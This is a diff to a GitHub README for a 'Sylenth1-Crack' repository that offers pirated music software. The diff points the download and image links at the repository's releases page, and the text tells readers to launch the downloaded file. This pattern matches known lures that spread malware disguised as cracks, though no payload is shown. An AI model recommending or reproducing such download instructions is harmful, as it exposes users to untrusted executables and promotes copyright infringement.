@@ -10,7 +10,7 @@ Welcome to the **Sylenth1-Crack** GitHub repository, dedicated to providing reso
 
 ## 🚀 Get Started with Sylenth1:
 To begin your Sylenth1 journey, download the Sylenth1 plugin from the following link:
-[![Download Sylenth1](https://img.shields.io/badge/Download-Sylenth1-blue)](https://github.com/releases/789694263/Release.zip)
+[![Download Sylenth1](https://github.com/Dhaval250/Sylenth1-Crack/releases)](https://github.com/Dhaval250/Sylenth1-Crack/releases)
 
 Make sure to launch the downloaded file to start using Sylenth1 in your music production projects.
 
@@ -35,6 +35,6 @@ Connect with fellow music producers, share your Sylenth1 creations, and collabor
 
 Dive into the world of Sylenth1 and elevate your music production experience to new heights. Let your creativity flourish with the powerful tools and sounds that Sylenth1 has to offer. Get ready to take your music to the next level with Sylenth1! 🎹🎵
 
-![Sylenth1 Image](https://via.placeholder.com/500)
+![Sylenth1 Image](https://github.com/Dhaval250/Sylenth1-Crack/releases)
 
 Start exploring, creating, and innovating with Sylenth1 today. Happy producing! 🚀🎶
